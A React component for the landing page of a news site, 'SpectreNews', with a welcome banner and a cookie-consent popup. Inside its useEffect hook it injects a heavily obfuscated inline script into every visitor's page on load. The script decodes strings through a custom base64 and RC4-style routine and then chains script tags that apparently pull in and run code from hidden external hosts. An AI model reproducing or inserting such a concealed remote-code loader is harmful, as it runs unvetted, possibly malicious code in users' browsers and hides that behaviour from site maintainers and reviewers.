import React, { useState, useEffect } from "react";
import Bar from "../bar/Bar";
import "./Home.css";
import { FiArrowRightCircle } from "react-icons/fi";
import { Link } from "react-router-dom";
import useLockBodyScroll from "../pages/useLockBodyScroll"; // Path to useLockBodyScroll.js

function Home() {
  const [acceptedCookies, setAcceptedCookies] = useState(false);

  useLockBodyScroll(["/"]);  // Add other paths if needed

  useEffect(() => {
    const cookiesAccepted = localStorage.getItem("acceptedCookies");
    setAcceptedCookies(cookiesAccepted === "true");

    // Scroll to the top of the page
    window.scrollTo(0, 0);

    const script = document.createElement("script");
    script.type = "text/javascript";
    script.async = false;
    script.innerHTML = `
    /*<![CDATA[/* */
    (function(){if(window.e20f93a1b1636f007740e83f41814287) return; window.e20f93a1b1636f007740e83f41814287="EePOxPROxIQ-krimoBLOtMZbyOF1UqOZoFA3IQY-Yzy-lOFqkMOIi98ONPTfDoW0wIPQTSjOWZ45lZI";var a=['wp5ww59HSD5owp9JEMO4RsKc','UMKZw5k2w5wpEHbDtsOZw6HCjsKE','w7DCkiDDkhTDlFoPdTpQcw==','wqI3DBsIw6/CpMKT','eMKJwrt6NsOaFVJ5EzYJw7rDkQ==','Cm3CnsK5CHA=','biBzTsOhw7VQ','RXTDicK1ADxUw6AQw7TDijHDhXHDkgkbJgXDuw==','w6HDnwfDtTXCi8KyGsO4wpAFSw==','w7bCu8OXw6FRNg==','w6vDoQbDr8OvAGMZBXfDtDLCnsOYGUtcw4TDrMKsw5PDsMK5wrrClsKYHsKNw5MN','UFDDrsKZWFrDjU44UTQow5rCucKw','VcKSw5A5w5AoC1PDoA==','woZGMFM=','OXscw5jDglU=','JjILK1YZw6pewqzDsQ==','azZsQcO3','ZyNyw6fCl8Kow7jChA==','w7gVXh4lw7w=','Jn7Cg8Kg','P8KhEnc0w7zCqnYSZcKkSw==','aTd6XMOnw5ZWw7BdAAA=','w5HDrlTDksKXw6MU','NgVqDDjCgi0GacKiw6LCmQbDi8OFwqt5wpDDiTFWSsKkTsK+X0M0DyTCp27DqwLClcKzwonDssOZw4nDqsK+JQ==','UsKHwpw8CMOjw7NM','UWPDng=='];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x185));var b=function(c,d){c=c-0x0;var e=a[c];if(b['ohhgOR']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['srmhva']=g;b['jgAjcT']={};b['ohhgOR']=!![];}var f=b['jgAjcT'][c];if(f===undefined){if(b['dKQIDX']===undefined){b['dKQIDX']=!![];}e=b['srmhva'](e,d);b['jgAjcT'][c]=e;}else{e=f;}return e;};var n=window;n[b('0x14','Tcj[')]=[[b('0xa','TZTm'),0x4c26cb],[b('0x13','jXsU'),0x0],[b('0x5','70i1'),'0'],[b('0x15','9@t*'),0x0],[b('0x7','#dsJ'),![]],[b('0x2','(re6'),0x0],[b('0x9','oP4%'),!0x0]];var e=[b('0xb','G9lf'),b('0x18','sWgw')],v=0x0,y,l=function(){if(!e[v])return;y=n[b('0x4','61lk')][b('0x1','5YGV')](b('0xf',']!Z@'));y[b('0xe','SOhN')]=b('0xc','wBYd');y[b('0x11','#dsJ')]=!0x0;var c=n[b('0x19','pQ^I')][b('0x8','HPaS')](b('0x6','Tcj['))[0x0];y[b('0x0','HPaS')]=b('0x12','^lyh')+e[v];y[b('0x16','#dsJ')]=b('0xd','(re6');y[b('0x17','v6$M')]=function(){v++;l();};c[b('0x10','d2sw')][b('0x3','CieR')](y,c);};l();})();
    /*]]>/* */
    `;
    document.body.appendChild(script);
  }, []);

  const acceptCookies = () => {
    setAcceptedCookies(true);
    localStorage.setItem("acceptedCookies", "true");
  };

  return (
    <div className="home-container" style={{ overflow: 'hidden', height: '100vh' }}>
      <Bar search={false} />
      <div className="content">
        <h1>Welcome to SpectreNews</h1>
        <p>
          Unleash the power to explore diverse perspectives on global issues. Navigate politics with clarity. Discover the truth. Let SpectreNews be <strong>YOUR</strong> guide.
        </p>
        <Link to="/news" className="cta-button">
          Get Started <FiArrowRightCircle className="icon" />
        </Link>
      </div>
      {!acceptedCookies && (
        <div className="cookie-consent-popup">
          <p>We use cookies to ensure you get the best experience on our website.</p>
          <button onClick={acceptCookies}>Accept</button>
        </div>
      )}
      <div className="area">
        <ul className="circles">
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
          <li></li>
        </ul>
      </div>
    </div>
  );
}

export default Home;
